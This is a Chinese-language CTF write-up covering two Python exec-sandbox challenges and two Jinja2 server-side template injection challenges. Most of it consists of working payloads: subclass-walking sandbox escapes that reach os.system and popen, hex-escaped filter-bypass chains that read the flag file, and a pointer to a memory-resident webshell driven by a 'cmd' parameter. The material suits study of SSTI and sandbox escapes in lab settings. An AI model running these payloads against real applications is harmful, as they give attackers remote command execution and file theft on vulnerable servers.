
### python沙箱1

审计源码得知本题会将 post 进来的数据直接 exec，但没有回显。

直接使用[这里](https://www.cnblogs.com/meraklbz/p/18572680)现成就有的内存马，小改写，把 {{}} 去掉之后作为 code 参数的值 POST，然后直接用 cmd 作为参数发 GET 请求就是 shell。

### python沙箱2

本题 exec 的时候限制了全局变量，内置函数全置空了，要恢复使用内存马的条件太麻烦，我们还是直接执行单条命令得了。由于本题还是会渲染 rce.html，我们由附件得知这个文件的路径是 ./templates/rce.html，因此只需要把结果输出到这里面即可。

网上面随便找个 breakjail 的payload，把命令一改完事。

```python
code={{[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']("os").system("cat ../flag > templates/rce.html")}}
```
###  python ssti1

`name={{().__class__.__bases__[0].__subclasses__()}}` 把所有子类搞出来，然后数第 140 个是 `os._wrap_close`，其具有 popen 方法。因此用如下 payload：

`name={{().__class__.__bases__[0].__subclasses__()[140].__init__.__globals__['popen']('whoami').read()}}`

### python ssti2

**前置知识**

参考： https://blog.csdn.net/qq_38154820/article/details/111399386

1. 在python中，可用以下表示法可用于访问对象的属性，代替点号

```python
{{().__class__}}              # 本题需要十六进制过检测，不考虑
{{()["__class__"]}}           # 本题在["__bases__"]时未知原因没进基类，给了个 tuple['__base__']
{{()|attr("__class__")}}      # 只能用这个了，这样可以访问对象的属性和方法，得到方法再加()就能调用
{{getattr('',"__class__")}}   # 本题环境中 getattr undefined
```

2. 使用 | 后会导致后面的内容统一被当成 Jinja 模板的过滤器，此时用 [] 访问列表和字典必然报错 `expected token 'end of print statement', got '['`。因此我们使用 `|attr('__getitem__')(x)` 来访问列表和字典，其中 x 可为列表的索引和字典的键。

**做题过程**

1. 得到基类的所有子类的列表：

```python
()|attr("\x5F\x5Fclass\x5F\x5F")|attr("\x5F\x5Fbases\x5F\x5F")|list|first|attr("\x5F\x5Fsubclasses\x5F\x5F")()
```

2. 得到 `os._wrap_close` 类的 `__init__.__globals__`：

```python
name={{()|attr("\x5F\x5Fclass\x5F\x5F")|attr("\x5F\x5Fbases\x5F\x5F")|list|first|attr("\x5F\x5Fsubclasses\x5F\x5F")()|attr('\x5F\x5Fgetitem\x5F\x5F')(140)|attr("\x5F\x5F\x69\x6e\x69\x74\x5F\x5F")|attr("\x5F\x5F\x67\x6c\x6f\x62\x61\x6c\x73\x5F\x5F")}}
```

   **这步得到的信息要手动分析，可以看出是一个字典，包含了一大堆方法和对象。**

3. (1).得到上述字典中以 `__builtins__` 为键的子字典中的 `__import__` 方法，然后导入 os 再 popen。

```python
name={{()|attr("\x5F\x5Fclass\x5F\x5F")|attr("\x5F\x5Fbases\x5F\x5F")|list|first|attr("\x5F\x5Fsubclasses\x5F\x5F")()|attr('\x5F\x5Fgetitem\x5F\x5F')(140)|attr("\x5F\x5F\x69\x6e\x69\x74\x5F\x5F")|attr("\x5F\x5F\x67\x6c\x6f\x62\x61\x6c\x73\x5F\x5F")|attr("\x5F\x5Fgetitem\x5F\x5F")("\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f")|attr("\x5F\x5Fgetitem\x5F\x5F")("\x5F\x5Fimport\x5F\x5F")("\x6f\x73")|attr("popen")("cat ../flag")|attr("read")()}}
```

3. (2).上述字典中以 popen 为键的值即为 popen 方法，直接调用。
```python
name={{()|attr("\x5F\x5Fclass\x5F\x5F")|attr("\x5F\x5Fbases\x5F\x5F")|list|first|attr("\x5F\x5Fsubclasses\x5F\x5F")()|attr('\x5F\x5Fgetitem\x5F\x5F')(140)|attr("\x5F\x5F\x69\x6e\x69\x74\x5F\x5F")|attr("\x5F\x5F\x67\x6c\x6f\x62\x61\x6c\x73\x5F\x5F")|attr("\x5F\x5Fgetitem\x5F\x5F")("popen")("cat ../flag")|attr("read")()}}
```

后续又经过研究，在我们得到一个 python 的类对象的时候，一般可以从以下几个方面利用。

```python
cas=[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0] # 以这个类作为示例
cas()._module.__builtins__['__import__'] # 得到这个类的实例对应模块对象的内置函数里的 __import__ 方法
cas.__init__.__builtins__['__import__']  # 使用__init__ 初始化方法里的内置函数
cas.__init__.globals                     # 可以获得相关模块的函数和一些内置函数
```
